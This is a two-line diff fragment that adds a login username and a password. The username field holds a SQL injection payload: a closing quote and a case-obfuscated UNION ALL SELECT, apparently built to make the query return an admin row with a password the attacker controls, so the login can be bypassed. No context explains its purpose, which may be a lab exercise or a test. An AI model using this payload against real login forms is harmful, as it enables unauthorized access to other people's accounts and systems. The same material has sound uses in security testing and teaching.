@@ -1,0 +1,2 @@
+username: admin' uNION aLL sELECT 'admin', 'doesntmatter' fROM 'users' wHERE username = 'admin
+password: anything
